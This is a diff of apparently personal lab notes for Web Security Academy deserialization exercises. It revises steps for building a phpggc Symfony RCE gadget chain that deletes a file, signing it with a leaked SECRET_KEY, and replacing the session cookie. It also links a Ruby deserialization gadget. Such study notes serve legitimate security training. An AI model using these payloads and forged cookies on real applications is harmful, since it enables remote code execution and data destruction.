@@ -2982,7 +2982,7 @@ java.io.Serializable; readObject(); InputStream
   - browse the file https://0a3b0063048c2c068207ceb900e60006.web-security-academy.net/cgi-bin/phpinfo.php
   - disover the "SECRET_KEY"
   - download [phpggc](https://github.com/ambionics/phpggc.git)
-  - Execute the command `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 > cookie.txt`
+  - Execute the command in gitbash `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0
   - gitbash `choco install php`
   - Create a payload file
     ```
@@ -2999,7 +2999,8 @@ java.io.Serializable; readObject(); InputStream
     chmod 750 scriptSignSha1.php
     php scriptSignSha1.php
     ```
-  - replace the session cookie
+  - wrap the session cookie text (make sure no line break)
+  - replace the session cookie in browser and refresh the page
 - Exploiting **Ruby deserialization** using a documented gadget chain
   - browse https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
   - Use online ruby compiler https://onecompiler.com/ruby/42q28rnu5
